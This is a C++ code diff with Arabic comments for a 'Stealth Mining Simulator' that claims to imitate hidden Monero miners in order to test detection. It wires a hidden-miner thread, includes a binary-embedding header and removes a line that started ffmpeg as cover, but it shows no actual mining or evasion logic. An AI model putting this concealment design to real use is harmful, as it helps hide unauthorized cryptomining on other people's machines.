@@ -4,8 +4,8 @@
  * هذا المشروع يهدف لمحاكاة سلوك برامج تعدين Monero (مثل XMRig) دون القيام بالتعدين الفعلي
  * الهدف هو اختبار أنظمة الكشف وتطوير استراتيجيات دفاعية أفضل
  * 
- * @author [اسمك]
- * @version 1.0
+ * @author Security Research Team
+ * @version 2.0
  */
 
 #include <iostream>
@@ -15,8 +15,7 @@
 #include <vector>
 #include <string>
 #include "evasion_monitor.h"  // استيراد فئة التمويه
-
-// ...existing code...
+#include "binary_embedder.h"  // استيراد فئة تضمين الملفات
 
 /**
  * الفئة الرئيسية لمحاكاة سلوك التعدين
@@ -29,7 +28,37 @@
  */
 class MiningBehaviorSimulator {
 public:
-    // Copilot سيقوم باقتراح التنفيذ هنا
+    MiningBehaviorSimulator() {
+        evasion = std::make_unique<EvasionMonitor>();
+        isRunning = false;
+    }
+    
+    void start() {
+        if (isRunning) {
+            std::cout << "[WARNING] Simulator already running" << std::endl;
+            return;
+        }
+        
+        isRunning = true;
+        std::cout << "[INFO] Starting mining behavior simulation..." << std::endl;
+        
+        // بدء المحاكاة في خيط منفصل
+        simulationThreads.emplace_back(&EvasionMonitor::runHiddenMiner, evasion.get());
+    }
+    
+    void stop() {
+        isRunning = false;
+        std::cout << "[INFO] Stopping simulation..." << std::endl;
+        
+        // انتظار انتهاء جميع الخيوط
+        for (auto& thread : simulationThreads) {
+            if (thread.joinable()) {
+                thread.join();
+            }
+        }
+        
+        simulationThreads.clear();
+    }
     
 private:
     // مكونات المحاكاة
@@ -47,20 +76,27 @@ private:
  * إمكانية تخصيص المحاكاة من خلال معلمات سطر الأوامر
  */
 int main(int argc, char* argv[]) {
+    std::cout << "=====================================" << std::endl;
+    std::cout << "🥷 Stealth Mining Simulator v2.0" << std::endl;
+    std::cout << "=====================================" << std::endl;
     std::cout << "بدء محاكاة سلوك التعدين للبحث الأمني" << std::endl;
     
-    // إنشاء مراقب التمويه
-    EvasionMonitor monitor;
+    // إنشاء المحاكي
+    MiningBehaviorSimulator simulator;
     
-    // تشغيل المعدني المخفي في خيط منفصل
-    std::thread minerThread(&EvasionMonitor::runHiddenMiner, &monitor);
+    // بدء المحاكاة
+    simulator.start();
     
-    // تشغيل البرنامج البريء (مثل FFmpeg) كغطاء
-    // مثال: تشغيل FFmpeg كعملية
-    system("ffmpeg -f null /dev/null &");
+    // انتظار إشارة الإنهاء (Ctrl+C)
+    std::cout << "[INFO] Press Ctrl+C to stop the simulation" << std::endl;
     
-    // انتظر الخيط
-    minerThread.join();
+    // حلقة لا نهائية - سيتم إنهاؤها بـ Ctrl+C
+    while (true) {
+        std::this_thread::sleep_for(std::chrono::seconds(1));
+    }
+    
+    // تنظيف (لن يصل هنا عادة)
+    simulator.stop();
     
     return 0;
 }
